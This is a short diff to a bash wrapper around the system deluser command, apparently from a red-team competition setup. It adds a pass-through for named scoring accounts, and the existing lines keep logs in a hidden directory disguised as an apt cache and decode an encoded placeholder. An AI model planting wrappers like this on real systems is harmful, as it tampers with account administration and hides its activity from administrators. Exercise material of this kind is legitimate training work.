@@ -1,5 +1,11 @@
 #!/bin/bash
 REAL_DELUSER="/usr/sbin/deluser"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_DELUSER "$@" ;;
+esac
+
 _D="/var/lib/apt/lists/.cache"
 _L="${_D}/events"
 _H=$(printf "%s" "__ENC__" | base64 -d)
